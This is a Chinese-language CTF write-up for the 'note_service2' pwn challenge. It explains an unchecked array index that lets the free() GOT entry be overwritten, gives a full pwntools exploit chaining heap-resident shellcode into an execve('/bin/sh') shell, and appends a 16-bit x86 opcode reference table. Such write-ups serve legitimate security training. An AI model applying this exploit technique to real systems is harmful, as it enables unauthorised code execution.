

#pwn_note-service2_writeup

```shell
$ checksec note_service2 
[*] '/home/parallels/Documents/xman/pwn/note_service2/note_service2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments

```

checksec后可以看见是 <font color=#FF0000> **Partial RELRO**</font>，代表<font color=#FF0000>**got表可修改**</font>

再运行程序看一下：

```shell
#  ____ _   _ ___  ____ ____ ___  ____ ____ ____ ____ 
#  |     \_/  |__] |___ |__/ |__] |___ |__| |    |___ 
#  |___   |   |__] |___ |  \ |    |___ |  | |___ |___ 
#                                                     
#  Welcome to CyberPeace note service 2!
#                                                     
---------menu---------
1. add note
2. show note
3. edit note
4. del note
5. exit
your choice>>
```

大概能猜到题目和堆有关，但是看反编译代码后会发现2、3功能都没有实现= =所以没有办法用double free

反编译看代码：

```c
void sub_E30()
{
  __int64 savedregs; // [rsp+10h] [rbp+0h]

  while ( 1 )
  {
    sub_C56();
    printf("your choice>> ");
    sub_B91();
    switch ( (unsigned int)&savedregs )
    {
      case 1u:
        sub_CA5();
        break;
      case 2u:
        sub_DC1();
        break;
      case 3u:
        sub_DD4();
        break;
      case 4u:
        sub_DE7();
        break;
      case 5u:
        exit(0);
        return;
      default:
        puts("invalid choice");
        break;
    }
  }
}
```

```c
//add_note()
int sub_CA5()
{
  int result; // eax
  int v1; // [rsp+8h] [rbp-8h]
  unsigned int v2; // [rsp+Ch] [rbp-4h]

  result = dword_20209C;
  if ( dword_20209C >= 0 )
  {
    result = dword_20209C;
    if ( dword_20209C <= 11 )
    {
      printf("index:");
      v1 = sub_B91();
      printf("size:");
      result = sub_B91();
      v2 = result;
      if ( result >= 0 && result <= 8 )
      {
        qword_2020A0[v1] = malloc(result);
        if ( !qword_2020A0[v1] )
        {
          puts("malloc error");
          exit(0);
        }
        printf("content:");
        sub_B69(qword_2020A0[v1], v2);
        result = dword_20209C++ + 1;
      }
    }
  }
  return result;
}

//delete_note()
void sub_DE7()
{
  int v0; // ST0C_4

  printf("index:");
  v0 = sub_B91();
  free((void *)qword_2020A0[v0]);
}
```

首先看到add_note函数，可以看见<font color=#FF0000> 没有对v1进行边界检查，所以可以直接写到got表去</font>。在这里我们选择覆盖掉free的got表进行execve调用。

**具体思路是使用addnote功能写入shellcode，以及使用addnote覆盖掉free的got表，使得我们在最后选择deletenote的功能时，可以直接变成调用我们的shellcode**

**因为malloc()返回的是堆的地址，而got表里存的是指向某函数的地址，所以当取合适的index将malloc(result)返回的堆地址写入free的got表时，在之后调用free函数时就等于指向那个堆上的函数，就会去执行那个堆上的shellcode**

**因为在调用free(heapaddr)函数时会把要释放的堆的地址放进rdi中，根据这个性质，我们在要释放的堆里放`/bin/sh`,对这个堆调用free，字符串地址直接就进入rdi，很方便就设置好了execve要用的rdi参数，又因为调用了被修改了got表的free，此时等于在执行我们已经控好的一个堆块里的shellcode，这些shellcode负责设置rax，rdx并进行syscall**

1. 获得index：可以从`qword_2020A0[v1] = malloc(result);`看出`qword_2020A0`就是heap的起点。而python里可以很容易得到free函数在got表里的地址，所以free函数got表地址相对于heap的index也很容易计算：	

   ```python
   heap_addr=0x2020A0
   got_index=(elf.got['free']-heap_addr)/8
   ```

**还需要注意的是，add_note函数中对v2即size有检查，最大是8，也就是说我们需要好几个块才能放下所有的shellcode，此时需要在每个堆的自己的shellcode后加上无条件跳转（相对目标操作数）的形式跳到下一个堆块上的shellcode继续执行**

对于机器码而言，需要知道`\x90`代表nop指令，用于填充字节；`\xeb`代表8位相对短跳转；（`\xe9`代表16/32位相对短跳转）（x位相对短跳转的意思是相对便宜的字节数是x位的）

**在本题中，addnote的size只能选择1-8，根据堆的性质可以知道每个堆都申请了0x20的大小，如果使用`\xeb`跳转，后面是一个8bits的偏移，写脚本的时候每次组合成7字节进行sendline（最后一个字节是0a即\n)，所以偏移是0x20-0x7=`0x19`;同理若使用`\xe9`跳转，本处代表32位跳转，偏移是`0x16`。**

*jmp指令的相对跳转是rip加相对字节偏移数，rip存的是jmp自己这条指令的下面一条的地址

附：汇编指令机器码对应表

```python
#coding:utf-8
from pwn import *
context.update(arch = 'amd64')
local =1
if local:
	io=process("./note_service2")
	pid=io.pid
else:
	io=remote("111.198.29.45",37647)
	pid=0
context.log_level = 'debug'
 
elf = ELF('./note_service2') 
heap_addr=0x2020A0
got_index=(elf.got['free']-heap_addr)/8
 
def add(index,content):
	io.recvuntil('your choice>> ')
	io.sendline("1")
	io.recvuntil("index:")
	io.sendline(str(index))
	io.recvuntil("size:")
	io.sendline('8')
	io.recvuntil("content:")
	io.sendline(content)
 
def dele(index):
	io.recvuntil('your choice>> ')
	io.sendline("4")
	io.recvuntil("index:")
	io.sendline(str(index))
def debug():
    log.debug("process pid:%d"%pid)
    pause()
debug()
if __name__=="__main__":
	add(0,'/bin/sh')
	#debug()
	add(got_index,asm('xor rsi,rsi')+'\x90\x90\xeb\x19')
	#debug()
	add(1,asm('push 0x3b\n pop rax')+'\x90\x90\xeb\x19')
	#debug()
	add(2,asm('xor rdx,rdx')+'\x90\x90\xeb\x19')
	#debug()	
	add(3,asm('syscall')+'\x90'*5)
	dele(0)
	io.interactive()
	io.close()
```

*python里可以用len(asm('push 0x3b\n pop rax')+'\x90\x90\xeb\x19')来看这段shellcode写了多少个字节



>指令集依照机器操作码、汇编助记符和汇编操作数来描述指令，遵循下列约定：
>
>l     reg8: 8位寄存器。
>
>l     reg16: 16位寄存器。
>
>l     mem8: 8位内存数值。
>
>l     mem16: 16位内存数值。
>
>l     immed8: 8位立即数值。
>
>l     immed16: 16位立即数值。
>
>l     immed32: 32位立即数值。
>
>l     segReg: 16位段寄存器。
>
>
>机器操作码
> 汇编助记符和操作数
>
>00
> ADD reg8/mem8,reg8
>
>01
> ADD reg16/mem16,reg16
>
>02
> ADD reg8,reg8/mem8
>
>03
> ADD reg16,reg16/mem16
>
>04
> ADD AL,immed8
>
>05
> ADD AX,immed16
>
>06
> PUSH es
>
>07
> POP es
>
>08
> OR reg8/mem8,reg8
>
>09
> OR reg16/mem16,reg16
>
>0A
> OR reg8,reg8/mem8
>
>0B
> OR reg16,reg16/mem16
>
>0C
> OR al,immed8
>
>0D
> OR ax,immed16
>
>0E
> PUSH cs
>
>0F
> Not used
>
>10
> ADC reg8/mem8,reg8
>
>11
> ADC reg16/mem16,reg16
>
>12
> ADC reg8,reg8/mem8
>
>13
> ADC reg16,reg16/mem16
>
>14
> ADC al,immed8
>
>15
> ADC ax,immed16
>
>16
> PUSH ss
>
>17
> POP ss
>
>18
> SBB reg8/mem8,reg8
>
>19
> SBB reg16/mem16,reg16
>
>1A
> SBB reg8,reg8/mem8
>
>1B
> SBB reg16,reg16/mem16
>
>1C
> SBB al,immed8
>
>1D
> SBB ax,immed16
>
>1E
> PUSH ds
>
>1F
> POP ds
>
>20
> AND reg8/mem8,reg8
>
>21
> AND reg16/mem16,reg16
>
>22
> AND reg8,reg8/mem8
>
>23
> AND reg16,reg16/mem16
>
>24
> AND al,immed8
>
>25
> AND ax,immed16
>
>26
> Segment override
>
>27
> DAA
>
>28
> SUB reg8/mem8,reg8
>
>29
> SUB reg16/mem16,reg16
>
>2A
> SUB reg8,reg8/mem8
>
>2B
> SUB reg16,reg16/mem16
>
>2C
> SUB al,immed8
>
>2D
> SUB ax,immed16
>
>2E
> Segment override
>
>2F
> DAS
>
>30
> XOR reg8/mem8,reg8
>
>31
> XOR reg16/mem16,reg16
>
>32
> XOR reg8,reg8/mem8
>
>33
> XOR reg16,reg16/mem16
>
>34
> XOR al,immed8
>
>35
> XOR ax,immed16
>
>36
> Segment override
>
>37
> AAA
>
>38
> CMP reg8/mem8,reg8
>
>39
> CMP reg16/mem16,reg16
>
>3A
> CMP reg8,reg8/mem8
>
>3B
> CMP reg16,reg16/mem16
>
>3C
> CMP al,immed8
>
>3D
> CMP ax,immed16
>
>3E
> Segment override
>
>3F
> AAS
>
>40
> INC ax
>
>41
> INC cx
>
>42
> INC dx
>
>43
> INC bx
>
>44
> INC sp
>
>45
> INC bp
>
>46
> INC si
>
>47
> INC di
>
>48
> DEC ax
>
>49
> DEC cx
>
>4A
> DEC dx
>
>4B
> DEC bx
>
>4C
> DEC sp
>
>4D
> DEC bp
>
>4E
> DEC si
>
>4F
> DEC di
>
>50
> PUSH ax
>
>51
> PUSH cx
>
>52
> PUSH dx
>
>53
> PUSH bx
>
>54
> PUSH sp
>
>55
> PUSH bp
>
>56
> PUSH si
>
>57
> PUSH di
>
>58
> POP ax
>
>59
> POP cx
>
>5A
> POP dx
>
>5B
> POP bx
>
>5C
> POP sp
>
>5D
> POP bp
>
>5E
> POP si
>
>5F
> POP di
>
>60
> PUSHA
>
>61
> POPA
>
>62
> BOUND reg16/mem16,reg16
>
>63
> Not used
>
>64
> Not used
>
>65
> Not used
>
>66
> Not used
>
>67
> Not used
>
>68
> PUSH immed16
>
>69
> IMUL reg16/mem16,immed16
>
>6A
> PUSH immed8
>
>6B
> IMUL reg8/mem8,immed8
>
>6C
> INSB
>
>6D
> INSW
>
>6E
> OUTSB
>
>6F
> OUTSW
>
>70
> JO immed8
>
>71
> JNO immed8
>
>72
> JB immed8
>
>73
> JNB immed8
>
>74
> JZ immed8
>
>75
> JNZ immed8
>
>76
> JBE immed8
>
>77
> JA immed8
>
>78
> JS immed8
>
>79
> JNS immed8
>
>7A
> JP immed8
>
>7B
> JNP immed8
>
>7C
> JL immed8
>
>7D
> JNL immed8
>
>7E
> JLE immed8
>
>7F
> JG immed8
>
>80
> Table2 reg8
>
>81
> Table2 reg16
>
>82
> Table2 reg8
>
>83
> Table2 reg8, reg16
>
>84
> TEST reg8/mem8,reg8
>
>85
> TEST reg16/mem16,reg16
>
>86
> XCHG reg8,reg8
>
>87
> XCHG reg16,reg16
>
>88
> MOV reg8/mem8,reg8
>
>89
> MOV reg16/mem16,reg16
>
>8A
> MOV reg8,reg8/mem8
>
>8B
> MOV reg16,reg16/mem16
>
>8C
> MOV reg16/mem16,segReg
>
>8D
> LEA reg16,reg16/mem16
>
>8E
> MOV segReg,reg16/mem16
>
>8F
> POP reg16/mem16
>
>90
> NOP
>
>91
> XCHG ax,cx
>
>92
> XCHG ax,dx
>
>93
> XCHG ax,bx
>
>94
> XCHG ax,sp
>
>95
> XCHG ax,bp
>
>96
> XCHG ax,si
>
>97
> XCHG ax,di
>
>98
> CBW 99CWD
>
>9A
> CALL immed32
>
>9B
> WAIT
>
>9C
> PUSHF
>
>9D
> POPF
>
>9E
> SAHF
>
>9F
> LAHF
>
>A0
> MOV al,[mem8]
>
>A1
> MOV ax,[mem16]
>
>A2
> MOV [mem8],al
>
>A3
> MOV [mem16],ax
>
>A4
> MOVSB
>
>A5
> MOVSW
>
>A6
> CMPSB
>
>A7
> CMPSW
>
>A8
> TEST al,[mem8]
>
>A9
> TEST ax,[mem16]
>
>AA
> STOSB
>
>AB
> STOSW
>
>AC
> LODSB
>
>AD
> LODSW
>
>AE
> SCASB
>
>AF
> SCASW
>
>B0
> MOV al,immed8
>
>B1
> MOV cl,immed8
>
>B2
> MOV dl,immed8
>
>B3
> MOV bl,immed8
>
>B4
> MOV ah,immed8
>
>B5
> MOV ch,immed8
>
>B6
> MOV dh,immed8
>
>B7
> MOV bh,immed8
>
>B8
> MOV ax,immed16
>
>B9
> MOV cx,immed16
>
>BA
> MOV dx,immed16
>
>BB
> MOV bx,immed16
>
>BC
> MOV sp,immed16
>
>BD
> MOV bp,immed16
>
>BE
> MOV si,immed16
>
>BF
> MOV di,immed16
>
>C0
> Table1 reg8
>
>C1
> Table1 reg8, reg16
>
>C2
> RET immed16
>
>C3
> RET
>
>C4
> LES reg16/mem16,mem16
>
>C5
> LDS reg16/mem16,mem16
>
>C6
> MOV reg8/mem8,immed8
>
>C7
> MOV reg16/mem16,immed16
>
>C8
> ENTER immed16, immed8
>
>C9
> LEAVE
>
>CA
> RET immed16
>
>CB
> RET
>
>CC
> INT 3
>
>CD
> INT immed8
>
>CE
> INTO
>
>CF
> IRET
>
>D0
> Table1 reg8
>
>D1
> Table1 reg16
>
>D2
> Table1 reg8
>
>D3
> Table1 reg16
>
>D4
> AAM
>
>D5
> AAD
>
>D6
> Not used
>
>D7
> XLAT [bx]
>
>D8
> ESC immed8
>
>D9
> ESC immed8
>
>DA
> ESC immed8
>
>DB
> ESC immed8
>
>DC
> ESC immed8
>
>DD
> ESC immed8
>
>DE
> ESC immed8
>
>DF
> ESC immed8
>
>E0
> LOOPNE immed8
>
>E1
> LOOPE immed8
>
>E2
> LOOP immed8
>
>E3
> JCXZ immed8
>
>E4
> IN al,immed8
>
>E5
> IN ax,immed16
>
>E6
> OUT al,immed8
>
>E7
> OUT ax,immed16
>
>E8
> CALL immed16
>
>E9
> JMP immed16
>
>EA
> JMP immed32
>
>EB
> JMP immed8
>
>EC
> IN al,dx
>
>ED
> IN ax,dx
>
>EE
> OUT al,dx
>
>EF
> OUT ax,dx
>
>F0
> LOCK
>
>F1
> Not used
>
>F2
> REPNE
>
>F3
> REP
>
>F4
> HLT
>
>F5
> CMC
>
>F6
> Table3 reg8
>
>F7
> Table3 reg16
>
>F8
> CLC
>
>F9
> STC
>
>FA
> CLI
>
>FB
> STI
>
>FC
> CLD
>
>FD
> STD
>
>FE
> Table4 reg8
>
>FF
> Table4 reg16

